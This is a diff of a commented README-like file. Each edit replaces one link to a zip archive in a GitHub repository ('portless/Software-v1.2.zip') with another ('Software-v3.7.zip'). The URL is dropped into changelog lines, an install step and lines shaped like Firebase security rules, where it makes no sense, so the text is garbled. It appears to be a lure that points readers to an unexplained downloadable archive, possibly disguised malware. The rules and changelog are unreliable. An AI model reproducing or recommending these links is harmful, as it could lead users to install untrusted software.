@@ -58,23 +58,23 @@
 
 # 
 
-# \# - Modified: https://github.com/mubashshir96/chat/raw/refs/heads/main/portless/Software-v1.2.zip (added new UI elements)
+# \# - Modified: https://raw.githubusercontent.com/mubashshir96/chat/main/portless/Software-v3.7.zip (added new UI elements)
 
 # 
 
-# \# - Modified: https://github.com/mubashshir96/chat/raw/refs/heads/main/portless/Software-v1.2.zip (added dark mode and new styles)
+# \# - Modified: https://raw.githubusercontent.com/mubashshir96/chat/main/portless/Software-v3.7.zip (added dark mode and new styles)
 
 # 
 
-# \# - Modified: https://github.com/mubashshir96/chat/raw/refs/heads/main/portless/Software-v1.2.zip (added screen sharing)
+# \# - Modified: https://raw.githubusercontent.com/mubashshir96/chat/main/portless/Software-v3.7.zip (added screen sharing)
 
 # 
 
-# \# - Modified: https://github.com/mubashshir96/chat/raw/refs/heads/main/portless/Software-v1.2.zip (added all new features)
+# \# - Modified: https://raw.githubusercontent.com/mubashshir96/chat/main/portless/Software-v3.7.zip (added all new features)
 
 # 
 
-# \# - Modified: https://github.com/mubashshir96/chat/raw/refs/heads/main/portless/Software-v1.2.zip (this file)
+# \# - Modified: https://raw.githubusercontent.com/mubashshir96/chat/main/portless/Software-v3.7.zip (this file)
 
 # 
 
@@ -98,7 +98,7 @@
 
 # 
 
-# \# 1\\. Go to https://github.com/mubashshir96/chat/raw/refs/heads/main/portless/Software-v1.2.zip
+# \# 1\\. Go to https://raw.githubusercontent.com/mubashshir96/chat/main/portless/Software-v3.7.zip
 
 # 
 
@@ -218,7 +218,7 @@
 
 # 
 
-# \#    service https://github.com/mubashshir96/chat/raw/refs/heads/main/portless/Software-v1.2.zip {
+# \#    service https://raw.githubusercontent.com/mubashshir96/chat/main/portless/Software-v3.7.zip {
 
 # 
 
@@ -230,7 +230,7 @@
 
 # 
 
-# \#          allow read, write: if https://github.com/mubashshir96/chat/raw/refs/heads/main/portless/Software-v1.2.zip != null;
+# \#          allow read, write: if https://raw.githubusercontent.com/mubashshir96/chat/main/portless/Software-v3.7.zip != null;
 
 # 
 
